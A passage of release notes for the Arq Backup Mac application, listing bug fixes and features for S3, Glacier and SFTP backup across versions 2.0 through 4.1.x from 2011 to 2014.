* Fixed "unsupported URL" error when updating credentials for Google Cloud Storage target.
* Fixed an issue where Arq could crash when expanding a folder "node" in the source list.
* Eliminated redundant calls to "restore" a Glacier object that's already been requested for restore.
* Eliminated redundant calls to check if a pack file is downloadable.
* Added computer name to email report.
* Retry SFTP backups on all transient errors (e.g. network not available).
* Fixed an issue in SFTP validation that could cause Arq to delete objects from the server that it shouldn't be deleting.

# Release Notes for Arq Backup Version 4.1.5

April 11, 2014

## Fixed Bugs

* Fixed an issue where Arq would ignore the port value if an S3-compatible server is configured with a non-standard port.
* Fixed an issue where Arq would sometimes fail to write an object to SFTP if its parent directory didn't already exist.
* Fixed an issue where the total-to-be-backed-up number was incorrect (much larger than the correct value).
* Reduced the height of the edit-target window so that it fits in 1024x768 displays.
* Fixed an issue where the restricted IAM user created by Arq could not list Glacier vaults and calculate total AWS storage.
* Fixed erroneous "Not all Glacier vaults have been inventoried" message when calculating total AWS storage.

# Release Notes for Arq Backup Version 4.1.4

April 3, 2014

## Fixed Bugs

* Fixed an issue where an error reading a pack file would cause the app to crash.
* Fixed an issue where an invalid pack file would cause the app to crash.
* Fixed an issue where an invalid pack index file would cause the app to crash.

# Release Notes for Arq Backup Version 4.1.3

April 1, 2014

## Fixed Bugs

* Show a progress indicator in "View Items Being Backed Up" window when it's still loading data.
* If backup prior to validation fails, don't immediately attempt to back up and validate again.
* Retry when Amazon returns with "a conflicting conditional operation is currently in progress against this resource."
* Fixed an issue where a not-found error caused the Calculate function to fail for SFTP targets.
* Fixed an issue where a not-found error caused data validation to fail for SFTP targets.

# Release Notes for Arq Backup Version 4.1.2

March 28, 2014

## Fixed Bugs

* Fixed an issue where, on startup, Arq would report "Failed to load folder list" if multiple targets are configured.
* Fixed an issue which caused arqcommitter to crash when reading 0-length items from packs.
* Fixed an issue which caused SFTP backup to crash.
* Fixed an issue where Arq would send excessive distributed notifications during the "calculate" phase, causing distnoted to use large amounts of CPU.
* Fixed an issue where Arq didn't use the transfer rate settings when backing up to SFTP.
* Fixed an issue where Arq didn't use the transfer rate settings when backing up to S3/Glacier.
* Fixed an issue where the "View Items Being Backed Up" window was blank if Arq started when a backup was already in progress.
* Fixed issues with IAM permissions in the restricted user created by the "Create Restricted IAM User" button.
* Display both user and path in the targets table view in the preferences.
* Fixed errors when attempting to view Other Computers using a restricted IAM user.
* Fixed crash reporter so that comments and email address are properly transmitted along with the report.

# Release Notes for Arq Backup Version 4.1.1

March 22, 2014

## Fixed Bugs

* Fixed an issue where Arq can't read the encryption password from the keychain on upgrading from older versions.
* Return an error instead of crashing when unexpected BlobKey data is encountered.
* Retry SFTP connection on error.
* Return an error when trying to parse a hex string that isn't actually hex.
* Write files to SFTP atomically, first writing a temp directory and then moving to final location.
* Fixed issues which caused the 'View Items Being Backed Up' window to be empty.
* Fixed an issue where Arq wouldn't restore the entire file from Glacier if some parts of it were not ready for download yet.
* Fixed an issue which prevented Arq from showing errors properly when restoring from Glacier.

# Release Notes for Arq Backup Version 4.1

March 17, 2014

## Added Features

* Implemented a "Change Credentials" button in the edit-target window in the preferences.
* Implemented a "Create Restricted IAM User" button for AWS targets in the edit-target window in the preferences.
* Added a "Learn More" button to the choose-a-target-type window.

## Fixed Bugs

* Fixed an issue where the backup window feature would not work if the from hour was greater than the to hour.
* Fixed an issue where a check mark appeared on the Pause menu item.
* Fixed the "sha1 must be 20 bytes" crash.
* Worked around an SFTP issue where the server returned access-denied instead of not-found.
* Fixed an issue where Arq was creating too many simultaneous SFTP connections.

# Release Notes for Arq Backup Version 4.0.3

March 8, 2014

## Fixed Bugs

* Fixed an issue where the last character of the SFTP path was being deleted from the configuration.
* Fixed an issue where SFTP usernames with '@' in them weren't working properly.
* Fixed an issue where Glacier restore would run twice in a row.
* Fixed an issue where SFTP backup wouldn't keep retrying when unable to resolve the hostname.
* Expand tilde in private key path.
* Changed label from "S3 (Standard Storage Class)" to "S3-Compatible" for non-AWS servers.
* Show "US STANDARD" instead of "N. VIRGINIA" for AWS server.

# Release Notes for Arq Backup Version 4.0.2

March 5, 2014

## Fixed Bugs

* If an encryption password is missing or incorrect, Arq will prompt for a new one.
* If the secret key for a target is missing or incorrect, Arq will prompt for a new one.
* Fixed an issue where GreenQloud credentials weren't being sent to the server properly in some cases.
* Fixed issues where clicking "Go Back" from the select-bucket window didn't go back to the correct window.
* Fixed an issue which caused an "absurd length requested" error during validation/budget enforcement.
* Fixed an issue where Arq would exit on startup if unable to resolve an SFTP hostname.
* Fixed an issue where Arq Agent would loop incessantly on startup if keychain entries were missing.
* If a target's secret key/password is missing from the keychain, Arq prompts the user to re-enter it.
* Show the target description in the error dialog if there's an error in Arq loading the target's folders.

# Release Notes for Arq Backup Version 4.0

March 3, 2014

Arq 4 includes many new features:

* Back up to AWS, GreenQloud, DreamObjects, Google Cloud Storage, or any other S3-compatible target.
* Back up to any SFTP server.
* Back up to multiple servers of different types, with different schedules and budgets.
* Optionally back up only on selected wifi networks.
* Optionally back up only during a specified window of time each day.
* Optionally send email notification after backup.
* Unified schedule and budget across S3 and Glacier backups.
* New S3/Glacier option backs up to your S3 bucket but with a "bucket lifecycle policy" so that objects in the bucket are moved to Glacier storage class for cost savings. This eliminates the need for cumbersome Glacier vaults. Also Arq can get the object list, so it can do full de-duplication and budgeting of Glacier backups. (Old-style Glacier backups from Arq 3 are still supported but don't have budgeting or full de-duplication.)

# Release Notes for Arq Backup Version 4.0b17

February 27, 2014

## Fixed Bugs

* Fixed one more bug that was causing "absurd string length" errors when validating data.
* Add up both S3 and S3/Glacier totals when calculating storage size for AWS targets.
* Fixed issues which caused last-enforcement dates to be set incorrectly and caused Arq Agent to validate data and enforce budget far too often.
* Fixed an issue which caused validation of S3/Glacier objects to proceed very slowly.

# Release Notes for Arq Backup Version 4.0b16

February 26, 2014

## Added Features

* Display last validation/enforcement time in target preferences view.
* Remember the last value entered in the "pause" dialog.
* Set validation/enforcement interval in days instead of hours.

## Fixed Bugs

* Fixed an issue which caused an "invalid signature" error when restoring from Glacier.
* Fixed an issue where clicking OK on a Glacier error message had no effect.
* Fixed an issue which was causing an "absurd string length" error and a crash when validating and enforcing budget.
* Fixed an issue which prevented SSL email sending for some SMTP servers.

# Release Notes for Arq Backup Version 4.0b15

February 25, 2014

## Fixed Bugs

* Fixed an issue where the backup would fail with "The internet connection appears to be offline" instead of retrying.
* Added a workaround for an issue with some broken SFTP servers which set file permissions when SFTP clients open them for reading.
* Removed a file-reading optimization that was causing random errors that I couldn't reproduce.

# Release Notes for Arq Backup Version 4.0b12

February 24, 2014

## Added Features

* Store the pause minutes as a default so that when the user pauses backups again, the previous value is the default.

## Fixed Bugs

* Fixed major SFTP issue where occasionally not all bytes are written to the file on the SFTP server.
* Fixed an SFTP performance issue where reading cached data was very slow.
* Fixed a validation bug for SFTP which made validation extremely slow as it asked the server about the existence of every single object.
* Fixed budget enforcement logic so that unreferenced objects are still deleted even when budget is not enabled.

# Release Notes for Arq Backup Version 4.0b11

February 23, 2014

## Added Features

* Display more information about the target in several places in the app, making it easier to select the correct target in the "Back Up Now" window, for example.

## Fixed Bugs

* Fixed an issue which caused repeated keychain permission prompts as you edited the SMTP password.
* Fixed an issue which could cause Arq to crash when you're entering an email address for email reports.
* Fixed an issue which caused Arq to prompt for target info when migrating from Arq 3. Now it properly uses the Arq 3 settings.
* Updated the 'how to create AWS credentials' video.
* If there's an error in the background thread reading the next chunk of file data, log the error immediately.
* Fixed bugs in pausing and resuming and properly displaying the in-progress status or pause reason.
* Fixed an issue that caused Arq to report successful backup when there was an error (or the backup was stopped by the user).

# Release Notes for Arq Backup Version 4.0b10

February 20, 2014

## Fixed Bugs

* Fixed an issue that caused crash on launch on OS X 10.7.
* Fixed an issue where the "Calculate" button was disabled.
* Fixed an issue where cache files were being created with 'root' ownership when they should be owned by the logged-in user. This issue could cause Arq to get "stuck" trying to write a cache file to a directory owned by root.

# Release Notes for Arq Backup Version 4.0b9

February 20, 2014

## Fixed Bugs

* Fixed a crash in arqcommitter when an error occurs during backup.
* Fixed a crash in arqcommitter when there's an error connecting to SFTP server.
* Fixed problems with SFTP paths that contain spaces.

# Release Notes for Arq Backup Version 4.0b8

February 16, 2014

## Added Features

* Added passphrase support for SFTP private keys.

## Fixed Bugs

* Fixed bugs where Arq wasn't pausing backup when it should be.
* Fixed big memory leak during upload.
* For non-AWS targets, use budget GB instead of budget dollars.
* Show 'SFTP' instead of 'S3' for storage type in the main window if it's an SFTP target.
* Retry on transient error (e.g. not connected to internet).
* Show target endpoint hostname in notifications.
* Added tooltip to 'Location' field so the user can view long paths.
* Fixed assorted other memory leaks.

# Release Notes for Arq Backup Version 4.0b7

February 13, 2014

## Fixed Bugs

* Fixed an issue where changes to the budget weren't saved properly.
* Fixed an issue where the user entered a relative path for SFTP when an absolute path is required.
* Fixed a bug where choosing an existing bucket that begins with a number isn't allowed.

# Release Notes for Arq Backup Version 4.0b6

February 11, 2014

## Added Features

* Show progress/total bytes in agent's menu.

## Fixed Bugs

* Fixed the issue where you try to add a folder to backups but nothing happens.
* Fixed the issue where you try to delete a Glacier vault and nothing happens.
* Reduced memory consumption of arqcommitter helper program during backup.
* Removed the pesky libssh2.dylib that's been causing so many crashes.

# Release Notes for Arq Backup Version 4.0b5

February 11, 2014

## Added Features

* Support for backup to multiple targets.

## Fixed Bugs

* Fixed a 'signature error' when deleting a legacy Glacier folder and its associated vault.
* Added option to configure custom port number for SFTP targets.
* Fixed dynamic-library loader issues.
* Fixed an issue that caused Arq to prompt repeatedly for permission to modify keychain items.

# Release Notes for Arq Backup Version 4.0b4

February 7, 2014

## Fixed Bugs

* Fixed pesky dynamic-loader issues with 'arqcommitter' helper program.

# Release Notes for Arq Backup Version 4.0b3

February 6, 2014

## Fixed Bugs

* Free the folder info after each folder is backed up to reduce memory consumption.
* Fixed a performance issue where Arq Agent was reading the entire pack instead of just the section needed.
* Check wireless network in use less frequently to improve performance.
* Store SHA1s in 20-byte form to reduce memory consumption.
* Don't show S3 warning when not using S3.
* Link to libssh2 dylib shipped with the app to avoid issues.

# Release Notes for Arq Backup Version 4.0b2

February 4, 2014

## Fixed Bugs

* Changed link path to libssh2.

# Release Notes for Arq Backup Version 4.0b1

February 3, 2014

## First beta!

February 3, 2014

## Fixed Bugs

* Reverted a change in 3.3.3 that resulted in excessive recalculation of encryption keys and excessive CPU usage.

# Release Notes for Arq Backup Version 3.3.3

January 22, 2014

## Fixed Bugs

* Fixed an issue where Glacier seems to be returning fewer bytes than it promises in its Content-Length header when Arq queries for Glacier job output. Arq now retries until it gets all the bytes.
* Instead of waiting for all the bytes of a file to be available from Glacier, start writing the file as soon as the first chunk is available. Otherwise, for very large (tens or hundreds of GBs) files, the chunks would start expiring from Glacier before Arq had a chance to download all of them.
* Read up to 10 SQS messages (the max allowed by AWS) at a time, instead of 1 at a time.

# Release Notes for Arq Backup Version 3.3.2

December 9, 2013

## Fixed Bugs

* Added backup set UUID to Glacier vault names to make restricting access
  via IAM easier.
* To avoid the "missing x-amz-archive-id" errors, Arq checks for 408
  response code whether or not the message body has a
  "RequestTimeoutException" code in it.
* Skip any item named "/<backupSetUUID>/buckets/" or any other
  invalid XML plist with that prefix (to get around bogus files that apps
  like Jungle Disk may have placed there).

# Release Notes for Arq Backup Version 3.3.1

November 13, 2013

## Fixed Bugs

* Fixed an issue where Glacier requests weren't being retried when they should have been.
* Fixed an issue where the wrong dates were used in communicating with AWS when the calendar was set to Thai.
* Changed the incomplete backup-record label from "(incomplete)" to "in progress").
* Changed the multi-threaded get-object-list operation to single-threaded to remove any chance of synchronization errors that could result in an incomplete object list.
* When validating objects in S3, if the object wasn't in the listing, execute a HEAD request against S3 to make sure it really isn't there before marking it as missing.
* When validating objects in S3, if an object was marked missing but it's actually available in S3, remove the "missing" flag.

# Release Notes for Arq Backup Version 3.3

October 16, 2013

## New Features

* Support for new Sydney Glacier region.

## Fixed Bugs

* Added Retina versions of caution and error icons.
* Give a hint to empty the trash if an error occurs when trying to launch Arq from Arq Agent.
* If no schedule type given in answer file, use manual.

# Release Notes for Arq Backup Version 3.2.6

August 14, 2013

## Fixed Bugs

* Added a 30-second timeout to HTTP/S requests to recover from bad connections.
* Fixed an issue where some license keys wouldn't work with answer files.

# Release Notes for Arq Backup Version 3.2.5

July 31, 2013

## Fixed Bugs

* Fixed an issue where, if an error occurred during an HTTP/S connection, the app would continue to try to use that connection (and become "stuck") instead of dropping it and creating a new one.
* Fixed an issue where not all relevant Glacier vaults were being included when calculating total Glacier data size.

# Release Notes for Arq Backup Version 3.2.4

July 1, 2013

## Fixed Bugs

* When user drags/drops an item to restore it, offer to overwrite the existing folder/file if one exists.
* Fixed an issue where a not-yet-available error from Glacier causes Arq to skip downloading a file.
* Retry when an AWS query request returns a 503 error.
* Changed the status message to 'Comparing existing files to backup data' when checking existing files to determine which files we don't need to restore.
* If pause is requested, abort uploading the current file, close the file descriptor (so the user can eject her external drive!) and start over on the file when resume is requested.

# Release Notes for Arq Backup Version 3.2.3

June 24, 2013

## Fixed Bugs

* Fixed an issue with 2-pack and 10-pack Arq license files.

# Release Notes for Arq Backup Version 3.2.2

June 23, 2013

## Fixed Bugs

* Fixed an issue with restored files and folders being owned by 'root'.

# Release Notes for Arq Backup Version 3.2.1

June 14, 2013

## Fixed Bugs

* Fixed a timeout error when adding a folder to be backed up to Glacier.

# Release Notes for Arq Backup Version 3.2

June 12, 2013

## New Features

* Restore into an existing folder of files, only downloading the files that are different or missing. Restore runs using administrator privileges to avoid permission issues. If you use SuperDuper or similar to clone your system periodically, in the event of a disk failure you could recover using the SuperDuper clone and then restore from Arq to update the missing/out-of-date files and avoid downloading everything from AWS!
* Added a "pause on battery power" feature -- set it in Arq's preferences.
* Added a "setthrottle" command-line option to change the transfer rate setting. This is useful for those who wish to change Arq's throttle setting via a script.

## Fixed Bugs

* Fixed an issue during very large Glacier restores where Arq would request too many items, which would then expire from AWS before Arq got a chance to download them.
* Improved memory usage and performance during Glacier restore.
* Fixed 10.6-related crashes.
* Fixed broken throttling issue.
* When calculating AWS usage for this computer, only include Glacier vaults that belong to this computer's backups.
* If you pause backups, Arq will pause after it finishes uploading the current file, not in the middle of the file. This ensures Arq releases the file handle so that you can unmount your external drive if that's what you're backing up.
* Fixed an issue where an error in getting the attributes of a file would cause the entire backup to fail.

# Release Notes for Arq Backup Version 3.1.1

May 21, 2013

## Fixed Bugs

* Improved HTTPS connection reuse for better Glacier upload performance.
* Fixed a memory consumption issue when checking for early-deletion charges before deleting Glacier archives.
* Retry if a Glacier 505 error occurs during restore.
* Fixed a UI glitch where the UUID field wasn't expanding with the window.
* Fixed some memory consumption issues when restoring a large folder from Glacier.

# Release Notes for Arq Backup Version 3.1

February 8, 2013

## New Features

* Added 'backupnow', 'pause' and 'resume' command-line functions to Arq. Run Arq.app/Contents/MacOS/Arq from the command line to use those arguments.

## Fixed Bugs

* Added checks to prevent bogus 0-byte Tree objects from being written.

# Release Notes for Arq Backup Version 3.0.6

January 17, 2013

## Fixed Bugs

* Fixed incorrect (zero) size shown in Glacier restore window.
* Fixed an Arq crash that occurs when switching backup sets.
* Fixed an issue where items backed up and then excluded were still appearing in subsequent backup records.
* Replaced deprecated [NSImage compositeToPoint:operation:] function call.
* Retry automatically on transient AWS error "The request signature we calculated does not match the signature you provided"
* Removed leading '/' from items in exclude summary.

# Release Notes for Arq Backup Version 3.0.5

December 28, 2012

## Fixed Bugs

* Fixed an issue which caused a "not-found" keychain error during setup.
* Fixed a typo in the price for RRS in the us-west-1 S3 region.

# Release Notes for Arq Backup Version 3.0.4

December 4, 2012

## Fixed Bugs

* Glacier vaults which don't belong to any Arq backups are shown under
  "Other Backup Sets" and can be deleted.
* Arq will manage the Glacier vault deletion process, including getting
  the vault inventory (waiting 4 hours for the response), deleting the
  archives, and deleting the vault. If the vault has been written to within
  the past day, Amazon will not allow the vault to be deleted and Arq will
  display an error. Wait 24 hours and try to delete the vault again.
* Fixed an issue where Arq wasn't deleting unreferenced S3 objects during
  budget enforcement if there are no S3 folders being backed up.
* Fixed an issue where attempting to restore from another computer's
  Glacier backups caused a "failed to open file" error.
* Fixed an issue where SNS topics and SQS queues were being erroneously
  deleted from the user's AWS account on startup.
* Fixed an issue where Arq would give a keychain-item-not-found error
  when attempting to delete a backup set from "Other Backup Sets".
* Fixed an issue where Retina icon versions weren't being shown.
* Fixed an issue where the Relocate and Reveal in Finder buttons were
  enabled for other computers' backups.
* Updated the preferences to reflect the new S3 pricing.
* If no folders are being backed up, don't display a notification in Notification Center (or Growl).

# Release Notes for Arq Backup Version 3.0.3

November 12, 2012

## Fixed Bugs

* Fixed an issue which caused "unable to remove existing file" error.
* Fixed an issue which caused backups to fail with "missing error information" when backing up to Glacier.
* Added support for new Sydney region (S3 only).

# Release Notes for Arq Backup Version 3.0.2

November 8, 2012

## Fixed Bugs

* Fixed a wrong-URL issue in the in-app purchase.

# Release Notes for Arq Backup Version 3.0.1

November 8, 2012

## Fixed Bugs

* Clarified initial setup process. Offer 3 options: back up home folder to S3, back up home folder to Glacier, or manual.
* Fixed an issue where the size-calculation was incorrectly reporting "Glacier not supported".
* Fixed the broken links to Arq Help.
* Fixed an issue which caused an "absurd string length" error when backup was aborted and then restarted.
* Fixed the Send Log File function.

# Release Notes for Arq Backup Version 3.0

November 6, 2012

## Glacier!

Arq 3 now supports Amazon Glacier, super-cheap storage from Amazon Web
Services. You choose which folders are backed up to S3 and which are backed up
to Glacier.

## New Features

* Support for backing up to **Amazon Glacier!**
* Separate schedule settings for S3 and Glacier.

# Release Notes for Arq Backup Version 2.9.2

November 6, 2012

## New Features

* During initial backup, the "incomplete" backup version is now shown in
  the main window, updated every 15 minutes or 1 GB uploaded. You can view
  and restore files that are backed up, even before the intial backup is
  complete.
* If nothing has changed since the last backup, no new backup version is
  created, to reduce clutter.

## Fixed Bugs

* Fixed a crash that occurs after files are restored.
* Fixed an issue where the app wouldn't run on a 32-bit Mac.

# Release Notes for Arq Backup Version 2.9.1

October 27, 2012

## Fixed Bugs

* Re-added missing public-key file so that Sparkle (automatic app updates) works properly.

# Release Notes for Arq Backup Version 2.9

October 27, 2012

## New Features

* New scheduling option: back up every 'n' hours.

## Fixed Bugs

* Vastly improved handling of missing S3 objects. Instead of dropping backup records and starting over, Arq now rewrites the backup records and indicates where files are missing in S3.
* Fixed the "stuck in restarting" problem.
* Fixed an issue where invalid or out-of-date information in a cache file causes the backup to stop.
* Changed budget enforcement to happen at the next backup time after budget enforcement start time is reached (instead of starting immediately).
* Fixed an issue where the estimated upload size was much too large, usually after installing an Arq update with an updated internal data format.
* Fixed an issue where the backup would fail on a transient 'connection refused' error.

- Fixed an issue with stale file data which caused an error related to an "AgentMutablePackEntry" with the wrong size.
- Encrypt all configuration plists stored in S3.
# Release Notes for Arq Backup Version 2.8.2

July 11, 2012

## Fixed Bugs

* Fixed an issue on 10.6 where Arq would continually ask for permission to read the keychain.

# Release Notes for Arq Backup Version 2.8.1

July 10, 2012

Signed the app with our new Mountain Lion-compatible "Developer ID" identity to prevent errors when attempting to download and launch Arq on Mountain Lion.

# Release Notes for Arq Backup Version 2.8

June 11, 2012

## New Features

* Added "answer file" support. Arq can now be configured using an answer file as described in the Arq manual.

## Fixed Bugs

* Catch "bad file descriptor" errors (which seem to happen often when Arq tries to back up Apple "receipt" files) and warn about those files instead of failing the entire backup.
* Provide the filename in the error message when a read error occurs.
* Fixed an issue where some symlinks with unusual names weren't being backed up correctly.
* Catch "address not available" network errors and retry.

# Release Notes for Arq Backup Version 2.7

May 21, 2012

## Fixed Bugs

* Fixed an issue where changes to extended attributes weren't being backed up if the file data didn't change as well.
* Fixed a crash that happens after transient (usually network) errors occur during restoring.
* Fixed an issue where unencrypted content-type info was being written to S3.

## Other Improvements

* Reduced the number of filesystem calls to improve backup performance and reduce load.

**Please Note:** Arq versions 2.6.3 and 2.6.4 stored
invalid backups. If you have used either of those versions, when you update to
version 2.7 (or later) Arq will check for old data that may have this problem, and will
prompt you to drop backups since March 7 if you think you had version 2.6.3 or
2.6.4 previously installed.

The full details of the bug are in [this blog
post](http://www.haystacksoftware.com/blog/2012/04/arq-2-6-8-is-out/).

# Release Notes for Arq Backup Version 2.6.9

April 28, 2012

## Fixed Bugs

* Fixed an issue where other backup sets (specifically those in the "US-Standard"-region S3 bucket) weren't appearing in Arq.
* Fixed an issue where backup was aborting on "connection-reset" error instead of retrying.
* Force the user to enter an email address in order to submit bug reports, support requests or feature requests (otherwise I can't reply!)
* Don't "growl" about finishing a backup if there aren't yet any folders configured for backup.

# Release Notes for Arq Backup Version 2.6.8

April 2, 2012

## Fixed Bugs

* Fixed another issue where various network errors could cause the backup to fail instead of retrying.

# Release Notes for Arq Backup Version 2.6.7

April 2, 2012

## Fixed Bugs

* Fixed an issue where various network errors could cause the backup to fail instead of retrying.

# Release Notes for Arq Backup Version 2.6.6

March 29, 2012

## Fixed Bugs

* Fixed an issue where a transient SSL problem would cause backups to fail instead of retry.

# Release Notes for Arq Backup Version 2.6.5

March 27, 2012

## Fixed Bugs

* Fixed an issue where Arq was incorrectly marking backed-up files as compressed when in fact they were not compressed.

# Release Notes for Arq Backup Version 2.6.4

March 27, 2012

## Fixed Bugs

* Fixed an issue during restore where Arq was attempting to uncompress data that weren't compressed.

# Release Notes for Arq Backup Version 2.6.3

March 27, 2012

* Added a 30-second timeout for HTTP requests to get around intermittent Amazon S3 issues.
* Fixed issues with "throttling". Both the fixed and the automatic transfer rate settings are much smoother.
* Find the next "chunk" boundary on a separate thread, improving latency/performance.

# Release Notes for Arq Backup Version 2.6.2

March 7, 2012

## Fixed Bugs

* Fixed an issue with old-style non-US bucket names (containing "." characters) that resulted in "The bucket you are attempting to access must be addressed using the specified endpoint" errors.

# Release Notes for Arq Backup Version 2.6.1

March 7, 2012

## New Features

* Added debug logging in HTTP module to help in identifying networking issues.

# Release Notes for Arq Backup Version 2.6

February 25, 2012

## New Features

* Added 'Send credentials to iOS device' feature to ease the setup process in the ArqView iOS app.

# Release Notes for Arq Backup Version 2.5.2

February 19, 2012

## Fixed Bugs

* Fixed an issue which was causing the agent to crash in newer versions of OS X.
* Fixed an issue where backups were starting even when Arq was supposed to be paused.

# Release Notes for Arq Backup Version 2.5.1

February 12, 2012

## Fixed Bugs

* Upgraded to Growl 1.2.3 framework so that it works with Growl 1.3 on Lion but still also works on Leopard (Intel and PPC) and Snow Leopard.

# Release Notes for Arq Backup Version 2.5

February 12, 2012

## New Features

* Display a Growl notification after each successful backup (can be turned off in the preferences).
* Display a Growl notification on backup error.

## Fixed Bugs

* Updated S3 pricing numbers to reflect Amazon's price change.
* Improved performance during budget enforcement.
* If you've selected "back up using administrator privileges" and you install an app update which overwrites the app, Arq prompts you to restore the "back up using administrator privileges" option.
* When there's a permission error getting the contents of a directory, log it and continue instead of aborting the backup.

# Release Notes for Arq Backup Version 2.4.3

January 18, 2012

## Fixed Bugs

* Fixed a bug where Arq wouldn't rescan the folder hierarchy after the user modified the set of backup selections.

# Release Notes for Arq Backup Version 2.4.2

January 12, 2012

## Fixed Bugs

* Fixed a bug where Arq couldn't decrypt and show other computers' backups that were created with Arq version 1.

# Release Notes for Arq Backup Version 2.4.1

January 5, 2012

## Fixed Bugs

* Fixed a bug where the wrong encryption salt was being used when attempting to browse other computers' backups, causing erroneous password prompts.

# Release Notes for Arq Backup Version 2.4

December 29, 2011

## New Features

* Added support for the new Amazon S3 sa-east-1 (SÃ£o Paulo, Brazil) region.

## Fixed Bugs

* Check whether Amazon S3 is experiencing long "eventual consistency"
  delays, abort backup and budget enforcement activities until the next
  backup interval to avoid potential data loss due to incorrect (old) values
  being returned from S3.

# Release Notes for Arq Backup Version 2.3

November 19, 2011

## New Features

* Added support for the new Amazon S3 US West (Oregon) region.

## Fixed Bugs

* Fixed a bug where backups were happening automatically (as part of budget enforcement) in manual mode.

# Release Notes for Arq Backup Version 2.2.4

October 27, 2011

## Fixed Bugs

* Fixed a bug where create time was not being backed up correctly for directories, and not being restored correctly for files or directories.

# Release Notes for Arq Backup Version 2.2.3

October 10, 2011

## Fixed Bugs

* Fixed a crash that occurred when logging the occasional SSL errors that S3 seems to cause.

# Release Notes for Arq Backup Version 2.2.2

## Fixed Bugs

* Excludes are now case-insensitive.
* If getxattr() call fails, log it but don't fail the whole backup.
* When relocating a folder, store the new mount point as well.
* If there were "failed files" in the previous backup, force a re-scan of the files on the next backup.
* Fixed an issue where editing the backup selections, pressing Cancel, and then opening the backup selections again didn't reset the view.
* Fixed an issue where, if a "head" backup version was deleted during budget enforcement due to missing S3 object(s), the budget enforcement wasn't aborting where it should have.

# Release Notes for Arq Backup Version 2.2.1

September 20, 2011

## Fixed Bugs

* Fixed app-update checking so that you'll be notified when there's a new version available.
* If budget enforcement fails, don't immediately try again (to avoid an endless loop).
* Disable the "Remove Folder from Backups" menu item unless a folder is selected and has the focus.
* In 'arqcommitter' helper process, die immediately if parent process dies.

# Release Notes for Arq Backup Version 2.2

September 9, 2011

## Fixed Bugs

* Retry on transient SSL certificate errors.

# Release Notes for Arq Backup Version 2.1

September 6, 2011

## New Features

* Added "prevent sleep during backup" option in the preferences.

## Fixed Bugs

* Fixed a crash that occurred when creating an error message.
* Skip pseudo-terminal device files such as Adobe InDesign lock files.
* If a pack file exists in S3 but its corresponding index does not, automatically rebuild the index.
* Fixed an issue which prevented relocating an Arq backup folder to its parent folder.
* Fixed an issue where the "Send Log" function wasn't collecting all Arq-related log messages.
* If mount point in folder configuration file is empty (e.g. a configuration from Arq 1), update the mount point. This enables Arq 2 to skip a folder when its mount point isn't mounted, avoiding error messages.
* Fixed a race condition which could lead to more than 1 "arqcommitter" helper process running at the same time, which caused random errors.

# Release Notes for Arq Backup Version 2.0.4

August 31, 2011

## New Features

* Added a 'Send Log File' function to the Help menu.

## Fixed Bugs

* Set the minimum size on the "View Items Being Backed Up" window.
* Fixed an issue where the main window would resize improperly when showing an error from the agent.
* Fixed an issue where a problem in a cache file would cause a crash.
* Switched to "path style" S3 requests to work around intermittent S3 errors on non-US buckets.
* Check for "405 errors" on S3 RRS objects during the budget enforcement process.
* Switched from browser view to outline view for selecting/unselecting items to work around some 10.5 issues.
* Fixed a crash that occurred when collapsing the "Other Backup Sets" view.
* Fixed an issue where the next backup date was reset to the following day without actually performing a backup.

# Release Notes for Arq Backup Version 2.0.3

August 26, 2011

## Fixed Bugs

* Require the correct password to delete a backup set.
* Fixed an issue that caused crashes when items under 'Other Backup Sets' are collapsed.
* Don't grab contact info from Address Book in feedback window.
* Don't use mmap method for finding file "chunk" boundaries.
* Ask only once per session about downloading an Arq 2 license; don't ask if the Arq 1 license fields are blank.
* Fixed an issue that caused a crash when a file changes to a directory between backups.
* Fixed a bug that caused "FSPathMakeRef" errors.
* Fixed an issue where, if you change the excludes for a folder and re-run the backup but no files have changed, the new backup doesn't respect the new exclude settings.
* Fixed an issue where the wrong last-modified date was shown for files.
* Don't use '.' characters in S3 bucket names. The S3 docs say it's OK to use '.', but in the forum they say it can be incompatible with their wildcard SSL cert '\*.s3.amazonaws.com'.

# Release Notes for Arq Backup Version 2.0.2

August 24, 2011

## Fixed Bugs

* Fixed a crash that occurred when hiding the "Other Backup Sets".
* Fixed a crash when backing up on PowerPC.

# Release Notes for Arq Backup Version 2.0.1

August 22, 2011

## Fixed Bugs

* Fixed an issue where "excludes" were lost when migrating from Arq 1 to Arq 2.

# Release Notes for Arq Backup Version 2.0

August 22, 2011

## Major New Features

* When a large file has a small change, Arq only uploads the changed part of the file.
* All objects are compressed when stored in S3.
* Arq optionally backs up with administrator privileges (to avoid permission errors when reading files).

## Additional New Features

* Arq resumes an in-progress backup properly after restart.
* View the list of items being backed up during the current backup session.
* A single backup progress percentage is now shown across all files/volumes being backed up.
* Browse all other computers' backups -- Arq prompts for a password when necessary.
* "Adopt" another computer's backups (to avoid re-uploading when replacing your computer).
* Delete a backup set (a computer's backup data) from within Arq.
* Easily change your S3 keys.
* New "Detail" log level that shows each file being uploaded to S3.
* Progress is now given in GB to 3 decimal places.
* Cumulative size of each folder is shown when browsing backups.
* Fully 64-bit compatible.

## Bug Fixes

* Much faster initial launch of Arq.
* S3 size is now given in gibibytes (instead of gigabytes), the same as Amazon gives.
* "Other computers" are now shown from all Arq-related buckets (across all regions) in the S3 account.
* Files and folders within a backup are sorted case-insensitive (just like the Finder does).
* More robust HTTPS communication, including support for proxies.

# Release Notes for Arq Beta Version 2.0

## Feature Additions

* On startup, if there is an Arq 1 license, confirm free upgrade with user and then create free Arq 2 license, install it, and send the license via email.
* Added a Remove button to the Folder summary view.

## Fixed Bugs

* When changing to new backup set, ask to back up home folder or choose folders yourself.
* Fixed issues with deleting a backup set.
* Rewrote many error messages into more readable form.
* If mount point of folder doesn't exist, don't create a backup record, and don't show an error.
* When computer wakes up, reset the next-backup date/time.
* Fixed a bug where the list of folders wasn't reloading after changing backup set.
* Fixed a bug where the 'create new backup set' radio button wasn't selected when no existing backup sets were found.
* Updated the help pages.
* Hide the 'View Items Being Backed Up' button if the agent is doing budget enforcement.
* Eliminated the color-coding for added/modified/deleted in the backup view; showing a text description instead.
* Open the correct tab of the support/bug report/feedback window.

# Release Notes for Arq Beta Version 2.0b12

## Fixed Bugs

* Fixed a mouse cursor problem in Snow Leopard.

# Release Notes for Arq Beta Version 2.0b10

## Changes

* Removed the "volume-based" approach and "legacy folders" of earlier betas and went back to the same folder approach as Arq 1.
* Added last modified date to backup outline view.
* Show last backup finish date in agent's menu.
* Improved performance of file-chunking algorithm (for binary diff feature).
* Fixed memory leaks.

## Bug Fixes

* Fixed an issue where data was incorrectly being deleted during budget enforcement process.

# Release Notes for Arq Beta Version 2.0b8

## Bug Fixes

